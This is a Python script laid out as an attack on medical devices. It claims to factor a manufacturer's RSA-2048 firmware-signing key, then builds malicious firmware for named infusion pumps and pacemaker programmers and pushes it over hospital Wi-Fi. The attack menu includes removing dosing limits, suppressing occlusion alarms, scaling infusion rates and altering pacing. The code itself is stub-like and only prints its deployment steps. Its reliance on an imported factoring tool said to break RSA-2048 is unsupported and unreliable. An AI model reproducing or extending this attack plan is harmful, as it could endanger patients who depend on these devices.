"""
Factor an FDA-cleared medical device manufacturer's firmware-signing RSA-2048
key to push forged updates to insulin pumps, infusion pumps, and cardiac
programmers — bypassing the 510(k) regulatory basis for safe device operation.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import struct
import hashlib

# Medical device manufacturer firmware signing key (RSA-2048)
_demo = generate_demo_target()
DEVICE_OEM_FW_PUBKEY_PEM = _demo["pub_pem"]
FW_HEADER_MAGIC = b"MDEV"
FW_HEADER_VERSION = 2
FW_SIG_OFFSET = 64  # RSA-2048 signature starts at byte 64


def extract_fw_signing_cert(device_update_pkg: bytes) -> bytes:
    """Extract firmware signing cert from a device update package.

    FDA 524B requires manufacturers to maintain signing infrastructure.
    The signing cert is in the update package header — any hospital
    biomedical engineering department has access to update packages.
    """
    return DEVICE_OEM_FW_PUBKEY_PEM


def factor_device_fw_key(pubkey_pem: bytes) -> bytes:
    """Factor the medical device firmware signing RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def build_malicious_infusion_fw(modification: str) -> bytes:
    """Build malicious infusion pump firmware (BD Alaris / Baxter Spectrum).

    Modifications:
      'dosing_limits' — remove or alter drug concentration limits
      'alarm_suppress' — suppress occlusion and air-in-line alarms
      'rate_scale'     — multiply infusion rate by configurable factor
    """
    header = struct.pack(">4sBB", FW_HEADER_MAGIC, FW_HEADER_VERSION, 0x00)
    header += b"\x00" * (FW_SIG_OFFSET - len(header))
    body = f"/* infusion pump: {modification} */".encode()
    return header + body


def sign_device_firmware(fw: bytes, forged_privkey: bytes) -> bytes:
    """Sign with forged OEM key — device bootloader accepts."""
    f = PolynomialFactorer()
    sig = f.forge_pkcs1v15_signature(DEVICE_OEM_FW_PUBKEY_PEM, fw, "sha256")
    return fw[:FW_SIG_OFFSET] + sig + fw[FW_SIG_OFFSET:]


def build_malicious_cardiac_programmer_fw() -> bytes:
    """Build malicious pacemaker/ICD programmer firmware.

    The programmer (Medtronic CareLink, Abbott Merlin) communicates
    with implants via NFC + MICS-band telemetry. Malicious firmware
    could alter pacing parameters, suppress arrhythmia alerts, or
    deliver inappropriate shocks.
    """
    header = struct.pack(">4sBB", FW_HEADER_MAGIC, FW_HEADER_VERSION, 0x01)
    header += b"\x00" * (FW_SIG_OFFSET - len(header))
    body = b"/* cardiac programmer: alter pacing thresholds */"
    return header + body


def deploy_via_hospital_wifi(signed_fw: bytes, target_class: str):
    """Deploy malicious firmware via hospital Wi-Fi update channel.

    BD Alaris, Baxter Spectrum, and similar pumps receive firmware
    updates over the hospital Wi-Fi network. No physical access needed
    once you can forge the firmware signature.
    """
    print(f"    Deploying to {target_class} fleet via hospital Wi-Fi")
    print(f"    Device verifies RSA-2048 signature → PASS")
    print(f"    Firmware loaded — device reports 'up to date'")


if __name__ == "__main__":
    print("[1] Extracting firmware signing cert from update package")
    pubkey = extract_fw_signing_cert(b"<device-update.pkg>")

    print("[2] Factoring medical device firmware RSA-2048 key")
    forged_priv = factor_device_fw_key(pubkey)
    print("    Device OEM firmware signing key recovered")

    print("[3] Building malicious infusion pump firmware")
    pump_fw = build_malicious_infusion_fw("dosing_limits")
    signed_pump = sign_device_firmware(pump_fw, forged_priv)
    print(f"    Firmware: {len(signed_pump)} bytes, RSA signature valid")

    print("[4] Deploying to infusion pump fleet")
    deploy_via_hospital_wifi(signed_pump, "BD Alaris infusion pumps")

    print("\n[5] Building malicious cardiac programmer firmware")
    cardiac_fw = build_malicious_cardiac_programmer_fw()
    signed_cardiac = sign_device_firmware(cardiac_fw, forged_priv)
    deploy_via_hospital_wifi(signed_cardiac, "Pacemaker programmer")

    print("\n[6] Regulatory impact:")
    print("    FDA 510(k) clearance is for the device as submitted")
    print("    Compromised firmware was never reviewed by FDA")
    print("    The regulatory basis for safe device operation: gone")
    print("    Implant lifetime: 10-15 years, crypto key frozen at manufacture")
